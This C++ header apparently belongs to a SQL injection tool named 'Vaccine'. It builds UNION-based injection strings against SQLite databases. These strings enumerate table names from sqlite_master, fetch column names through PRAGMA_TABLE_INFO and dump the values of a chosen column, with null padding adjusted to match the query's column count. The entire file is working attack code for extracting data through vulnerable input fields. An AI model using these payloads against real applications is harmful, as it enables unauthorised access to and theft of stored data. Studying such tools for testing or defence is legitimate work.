#ifndef SQLITE_UNION_BASED
#define SQLITE_UNION_BASED

#include "../../Vaccine.hpp"
#include "../mysql/mysql.hpp"

struct sqlite_union_based
{
        static std::string payload(sptr_vector& config, uint8 type)
        {
                std::string offset;
                switch (type)
                {
                case TABLES:
                        offset = *config[UNION_BASED_OFFSET];
                        *config[UNION_BASED_OFFSET] += "null, ";
                        return "' UNION SELECT " + offset + "name " +
                               "FROM sqlite_master "
                               "WHERE type='table'-- ";
                case COLUMNS:
                        if (config[UNION_BASED_OFFSET + 1] != NULL)
                        {
                                for (uint8 i = 0; i < OFFSET_LEN; ++i)
                                        config[UNION_BASED_OFFSET]->pop_back();
                                config[UNION_BASED_OFFSET + 1] = NULL;
                        }
                        return "' UNION SELECT " +
                               *config[UNION_BASED_OFFSET] + "name " +
                               "FROM PRAGMA_TABLE_INFO('" +
                               *config[UNION_BASED_TABLE + 1] + "')-- ";
                case VALUES:
                        return "' UNION SELECT " + *config[UNION_BASED_OFFSET] +
                               *config[UNION_BASED_COLUMN] + " " +
                               "FROM " + *config[UNION_BASED_TABLE] + "-- ";
                default:
                        return std::string();
                }
        };
};
#endif